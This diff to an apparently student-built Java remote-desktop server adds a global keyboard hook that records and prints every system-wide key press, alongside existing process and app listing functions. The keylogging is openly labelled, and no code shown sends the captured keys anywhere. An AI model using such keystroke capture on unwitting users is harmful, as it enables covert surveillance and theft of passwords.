@@ -1,5 +1,9 @@
 package group02.rdpserver.function;
 
+import lc.kra.system.keyboard.GlobalKeyboardHook;
+import lc.kra.system.keyboard.event.GlobalKeyAdapter;
+import lc.kra.system.keyboard.event.GlobalKeyEvent;
+
 import javax.imageio.ImageIO;
 import java.awt.*;
 import java.awt.image.BufferedImage;
@@ -7,9 +11,9 @@ import java.io.BufferedReader;
 import java.io.File;
 import java.io.IOException;
 import java.io.InputStreamReader;
-import java.text.SimpleDateFormat;
-import java.util.Arrays;
-import java.util.Calendar;
+import java.util.ArrayList;
+import java.util.Date;
+
 
 public class Functions {
     public static BufferedReader getProcess(){
@@ -22,7 +26,6 @@ public class Functions {
         }
         return input;
     }
-
 
     public static BufferedReader getApp(){
         BufferedReader input = null;
@@ -114,16 +117,33 @@ public class Functions {
 
     }
 
+    public static GlobalKeyboardHook getKeyStrokeOn(ArrayList<Integer> listKeypress) {
+        try {
+            GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true);
 
+            keyboardHook.addKeyListener(new GlobalKeyAdapter() {
+                @Override
+                public void keyPressed(GlobalKeyEvent event) {
+                    System.out.println(new Date() + " - " + event.getKeyChar() + " - " + event);
+                    listKeypress.add(event.getVirtualKeyCode());
+                }
+            });
 
+            return keyboardHook;
+        } catch (UnsatisfiedLinkError e) {
+            e.printStackTrace();
 
-
-
-
-    public static void getKeyStroke(){
-
+            return null;
+        }
     }
 
-
+    public static boolean getKeyStrokeOff(GlobalKeyboardHook keyboardHook) {
+        try {
+            keyboardHook.shutdownHook();
+            return true;
+        } catch (Exception e) {
+            return false;
+        }
+    }
 
 }
